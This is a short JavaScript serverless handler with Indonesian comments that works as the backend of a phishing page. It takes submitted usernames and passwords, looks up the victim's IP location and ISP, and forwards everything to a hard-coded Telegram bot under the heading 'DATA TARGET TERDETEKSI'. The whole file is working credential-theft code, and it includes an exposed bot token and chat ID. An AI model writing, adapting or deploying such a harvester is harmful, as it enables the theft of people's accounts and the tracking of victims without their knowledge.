// api/kirim.js
export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    const { user, pw, device } = req.body;
    
    // Ambil IP target dari header Vercel
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const cleanIp = ip.split(',')[0].trim();

    // --- KONFIGURASI BOT TELEGRAM LU ---
    const BOT_TOKEN = '8679423170:AAFJPmmcCK1ZeQMr42uG_cQFUSR0psXW8R8'; 
    const CHAT_ID = '8521019587'; 

    let geoInfo = "Gagal melacak lokasi";
    try {
        // Lacak lokasi menggunakan API publik (IP-API)
        const geoRes = await fetch(`http://ip-api.com/json/${cleanIp}`);
        const geoData = await geoRes.json();
        if(geoData.status === 'success') {
            geoInfo = `${geoData.city}, ${geoData.regionName}, ${geoData.country}\n🌐 ISP: ${geoData.isp}`;
        }
    } catch (e) {
        console.error("Geo Tracking Error");
    }

    const teks = `
😈 **DATA TARGET TERDETEKSI (VERCEL)** 😈
━━━━━━━━━━━━━━━━━━━━
👤 **User:** \`${user}\`
🔑 **Pass:** \`${pw}\`
━━━━━━━━━━━━━━━━━━━━
🌐 **IP Address:** \`${cleanIp}\`
📍 **Lokasi:** ${geoInfo}
📱 **Device:** ${device}
⏰ **Waktu:** ${new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'})}
━━━━━━━━━━━━━━━━━━━━
`;

    try {
        // Kirim data ke Telegram menggunakan fetch bawaan Node.js
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: teks,
                parse_mode: 'Markdown'
            })
        });

        return res.status(200).json({ status: 'success' });
    } catch (error) {
        return res.status(500).json({ status: 'error' });
    }
}

